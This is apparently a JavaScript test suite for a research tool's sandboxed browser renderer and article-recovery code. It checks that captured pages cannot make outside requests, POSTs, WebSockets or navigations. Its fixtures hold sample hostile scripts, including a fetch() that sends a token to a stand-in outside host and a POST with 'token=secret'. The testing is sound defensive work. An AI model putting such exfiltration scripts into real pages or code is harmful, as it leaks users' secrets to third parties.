import test from "node:test"
import assert from "node:assert/strict"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import { SourceFetcher } from "../scripts/research/fetch.mjs"
import { renderDocument } from "../scripts/research/browser.mjs"
import { recoverEmptyHTML, needsBodyRecovery } from "../scripts/research/body-recovery.mjs"
import { parseDocument, assertStoredEvidence } from "../scripts/research/parser.mjs"
import { RunState, atomicWrite } from "../scripts/research/run-state.mjs"
import { archiveManifest } from "../scripts/research/archive.mjs"
import { main as research } from "../scripts/research.mjs"

test("browser-rendered source scripts cannot fetch outside the source host policy", async (t) => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "garden-browser-policy-")))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  const previousPython = process.env.RESEARCH_PYTHON
  process.env.RESEARCH_PYTHON =
    previousPython || path.resolve(".local/research/local-ai/runtime/venv/bin/python")
  t.after(() => {
    if (previousPython === undefined) delete process.env.RESEARCH_PYTHON
    else process.env.RESEARCH_PYTHON = previousPython
  })

  const articleURL = "https://publisher.example/article/1"
  const hostileURL = "https://outside.example/collect?token=secret"
  const writeURL = "https://publisher.example/state-change"
  const requests = []
  const fetcher = new SourceFetcher(root, {
    interval_ms: 0,
    resolve: async () => [{ address: "1.1.1.1", family: 4 }],
    transport: async (url) => {
      const value = url.toString()
      requests.push(value)
      if (value.endsWith("/robots.txt"))
        return {
          status: 200,
          headers: { "content-type": "text/plain" },
          body: Buffer.from("User-agent: *\nAllow: /\n"),
        }
      if (value === articleURL)
        return {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
          body: Buffer.from(
            `<!doctype html><html><head><title>Source</title></head><body><p>Source text</p><script>fetch(${JSON.stringify(hostileURL)}).catch(() => {});fetch(${JSON.stringify(writeURL)},{method:"POST",body:"token=secret"}).catch(() => {})</script></body></html>`,
          ),
        }
      throw new Error(`Unexpected outbound fetch: ${value}`)
    },
  })
  const source = await fetcher.fetch(articleURL, { allowed_hosts: ["publisher.example"] })
  assert.equal(source.fetch_status, "captured")

  await assert.rejects(
    renderDocument(root, fetcher, source, {
      allowed_hosts: ["publisher.example"],
      timeout_ms: 10000,
    }),
    /Host outside channel policy/,
  )
  assert.deepEqual(
    requests.filter((url) => url.includes("outside.example") || url === writeURL),
    [],
    "external hosts and non-GET requests must be stopped before parent source acquisition",
  )
})

test("browser-rendered source scripts cannot send writes or open WebSockets", async (t) => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "garden-browser-methods-")))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  const previousPython = process.env.RESEARCH_PYTHON
  process.env.RESEARCH_PYTHON =
    previousPython || path.resolve(".local/research/local-ai/runtime/venv/bin/python")
  t.after(() => {
    if (previousPython === undefined) delete process.env.RESEARCH_PYTHON
    else process.env.RESEARCH_PYTHON = previousPython
  })

  const articleURL = "https://publisher.example/article/2"
  const writeURL = "https://publisher.example/state-change"
  const socketURL = "wss://publisher.example/live"
  const requests = []
  const fetcher = new SourceFetcher(root, {
    interval_ms: 0,
    resolve: async () => [{ address: "1.1.1.1", family: 4 }],
    transport: async (url) => {
      const value = url.toString()
      requests.push(value)
      if (value.endsWith("/robots.txt"))
        return {
          status: 200,
          headers: { "content-type": "text/plain" },
          body: Buffer.from("User-agent: *\nAllow: /\n"),
        }
      if (value === articleURL)
        return {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
          body: Buffer.from(
            `<!doctype html><html><body><p>Source text</p><script>fetch(${JSON.stringify(writeURL)},{method:"POST",body:"token=secret"}).catch(() => {});new WebSocket(${JSON.stringify(socketURL)})</script></body></html>`,
          ),
        }
      throw new Error(`Unexpected outbound fetch: ${value}`)
    },
  })
  const source = await fetcher.fetch(articleURL, { allowed_hosts: ["publisher.example"] })
  const rendered = await renderDocument(root, fetcher, source, {
    allowed_hosts: ["publisher.example"],
    timeout_ms: 10000,
  })

  assert.equal(rendered.fetch_status, "captured")
  assert.equal(requests.includes(writeURL), false, "same-host POST must not reach source transport")
  assert.equal(requests.includes(socketURL), false, "WebSocket must not reach source transport")
  assert.equal(
    requests.filter((url) => url === articleURL).length,
    1,
    "navigation uses captured bytes",
  )
})

test("source scripts cannot navigate the article, embed documents, or open popup documents", async (t) => {
  const previousPython = process.env.RESEARCH_PYTHON
  process.env.RESEARCH_PYTHON =
    previousPython || path.resolve(".local/research/local-ai/runtime/venv/bin/python")
  t.after(() => {
    if (previousPython === undefined) delete process.env.RESEARCH_PYTHON
    else process.env.RESEARCH_PYTHON = previousPython
  })
  for (const [mode, script] of [
    ["navigation", "location.assign(target)"],
    [
      "iframe",
      'const frame=document.createElement("iframe");frame.src=target;document.body.append(frame)',
    ],
    ["popup", 'window.open(target,"_blank")'],
  ])
    await t.test(mode, async (t) => {
      const root = fs.realpathSync(
        fs.mkdtempSync(path.join(os.tmpdir(), "garden-browser-navigation-")),
      )
      t.after(() => fs.rmSync(root, { recursive: true, force: true }))
      const url = "https://publisher.example/article/3",
        target = "https://publisher.example/unrequested-document"
      const requests = []
      const fetcher = new SourceFetcher(root, {
        interval_ms: 0,
        resolve: async () => [{ address: "1.1.1.1", family: 4 }],
        transport: async (u) => {
          const value = u.toString()
          requests.push(value)
          if (value.endsWith("/robots.txt"))
            return {
              status: 200,
              headers: { "content-type": "text/plain" },
              body: Buffer.from("User-agent: *\nAllow: /\n"),
            }
          if (value === url)
            return {
              status: 200,
              headers: { "content-type": "text/html" },
              body: Buffer.from(
                `<!doctype html><html><body><p>Captured source</p><script>const target=${JSON.stringify(target)};${script}</script></body></html>`,
              ),
            }
          throw Error("Unexpected document request")
        },
      })
      const original = await fetcher.fetch(url)
      await assert.rejects(
        renderDocument(root, fetcher, original, {
          allowed_hosts: ["publisher.example"],
          timeout_ms: 10000,
        }),
        /Source navigation outside captured document/,
      )
      assert.equal(
        requests.includes(target),
        false,
        "even same-host navigation is outside this source capture",
      )
      assert.equal(
        fs.existsSync(path.join(root, "renders")),
        false,
        "a replaced document cannot become derived article evidence",
      )
    })
})

test("common recovery reads rendered article, resumes without HTTP and rejects changed resource evidence", async (t) => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "garden-body-recovery-")))
  t.after(() => fs.rmSync(root, { recursive: true, force: true }))
  const previousPython = process.env.RESEARCH_PYTHON
  process.env.RESEARCH_PYTHON =
    previousPython || path.resolve(".local/research/local-ai/runtime/venv/bin/python")
  t.after(() => {
    if (previousPython === undefined) delete process.env.RESEARCH_PYTHON
    else process.env.RESEARCH_PYTHON = previousPython
  })
  const url = "https://publisher.example/news/dynamic"
  const scriptURL = "https://publisher.example/article.js"
  const requests = []
  const article = `<article><h1>Industrial robot controller released</h1><p>The manufacturer released an industrial robot controller on October 8, 2026. It supports coordinated motion of six robot axes and allows engineers to record the measured operating parameters during assembly.</p><p>The controller includes a calibration procedure for the robot joints. The procedure measures joint positions before the next production run and stores the results locally. The manufacturer described the measurement process in its technical release.</p><p>The release specifies the controller interface and the conditions used for measurements. It reports the supported robot configuration and the software version used during the tests. Engineers can consult the release for the installation steps and interface settings.</p></article>`
  const fetcher = new SourceFetcher(root, {
    interval_ms: 0,
    resolve: async () => [{ address: "1.1.1.1", family: 4 }],
    transport: async (requested) => {
      const value = requested.toString()
      requests.push(value)
      if (value.endsWith("/robots.txt"))
        return {
          status: 200,
          headers: { "content-type": "text/plain" },
          body: Buffer.from("User-agent: *\nAllow: /\n"),
        }
      if (value === url + "-blocked")
        return {
          status: 200,
          headers: { "content-type": "text/html" },
          body: Buffer.from(
            '<html><body><div id="app"></div><script>fetch("https://outside.example/forbidden").catch(() => {})</script></body></html>',
          ),
        }
      if (value === url)
        return {
          status: 200,
          headers: { "content-type": "text/html" },
          body: Buffer.from(
            '<html><head><title>Industrial robot controller released</title><meta property="article:published_time" content="2026-10-08"></head><body><div id="app"></div><script src="/article.js"></script></body></html>',
          ),
        }
      if (value === scriptURL)
        return {
          status: 200,
          headers: { "content-type": "application/javascript" },
          body: Buffer.from(`document.getElementById('app').innerHTML=${JSON.stringify(article)}`),
        }
      throw Error("Unexpected fixture request")
    },
  })
  const document = await fetcher.fetch(url)
  const original = await parseDocument(root, document)
  assert.equal(original.quality.reason, "body-not-extracted")
  const run = new RunState(root, "recover", { source_version_id: document.source_version_id })
  const recovered = await recoverEmptyHTML(root, run, fetcher, document, original)
  assert.equal(recovered.status, "recovered")
  assert.equal(recovered.parse.status, "extracted")
  assert.ok(recovered.parse.blocks.some((block) => block.text.includes("calibration procedure")))
  assert.equal(recovered.document.rendered_from, document.source_version_id)
  assert.equal(recovered.document.capture_method, "browser-render")
  assert.equal(recovered.parse.dates.published_at, "2026-10-08")
  assert.equal(requests.filter((request) => request === url).length, 1)
  assertStoredEvidence(root, [recovered.document], [recovered.parse])
  const previousRequests = [...requests]
  const resumed = await recoverEmptyHTML(root, run, fetcher, document, original)
  assert.deepEqual(resumed, recovered)
  assert.deepEqual(requests, previousRequests)
  const blockedDocument = await fetcher.fetch(url + "-blocked")
  const blockedParse = await parseDocument(root, blockedDocument)
  const failedRun = new RunState(root, "recover-blocked", {
    source_version_id: blockedDocument.source_version_id,
  })
  const failed = await recoverEmptyHTML(root, failedRun, fetcher, blockedDocument, blockedParse)
  assert.equal(failed.status, "render_failed")
  assert.equal(failed.observation.error, "Host outside channel policy")
  assert.equal(failed.document.source_version_id, blockedDocument.source_version_id)
  assert.equal(failed.parse.blocks.length, 0)
  const afterFailure = [...requests]
  assert.deepEqual(
    await recoverEmptyHTML(root, failedRun, fetcher, blockedDocument, blockedParse),
    failed,
  )
  assert.deepEqual(requests, afterFailure, "blocked recovery is not retried on resume")
  atomicWrite(root, "runs/recover/documents.json", [recovered.document])
  const manifest = archiveManifest(root, "recover")
  assert.ok(
    manifest.files.some((file) => file.path === document.body_path),
    "original shell retained",
  )
  const renderManifest = JSON.parse(
    fs.readFileSync(path.join(root, recovered.document.capture_provenance.manifest_path)),
  )
  const resource = renderManifest.resources.find((item) => item.url === scriptURL).document
  assert.ok(
    manifest.files.some((file) => file.path === resource.body_path),
    "script evidence retained",
  )
  await research(["source-register", "--root", root, "--run", "register-render"])
  const registeredURLs = JSON.parse(
    fs.readFileSync(path.join(root, "runs/register-render/source-url-inputs.json")),
  )
  assert.ok(
    registeredURLs.urls.includes(scriptURL),
    "existing source register reads v2 browser resources",
  )
  fs.appendFileSync(path.join(root, resource.body_path), "changed")
  assert.throws(
    () => assertStoredEvidence(root, [recovered.document], [recovered.parse]),
    /Browser resource body hash mismatch/,
  )
})

test("common recovery excludes readable, blocked, PDF and partial nonempty sources", () => {
  const document = { mime_type: "text/html" }
  const parse = { status: "partial", blocks: [], quality: { reason: "body-not-extracted" } }
  assert.equal(needsBodyRecovery(document, parse), true)
  for (const other of [
    { ...parse, status: "blocked" },
    { ...parse, status: "extracted" },
    { ...parse, blocks: [{ text: "Partial content" }] },
    { ...parse, quality: { reason: "authentication-page" } },
  ])
    assert.equal(needsBodyRecovery(document, other), false)
  assert.equal(needsBodyRecovery({ mime_type: "application/pdf" }, parse), false)
  assert.equal(needsBodyRecovery({ ...document, rendered_from: "original" }, parse), false)
})
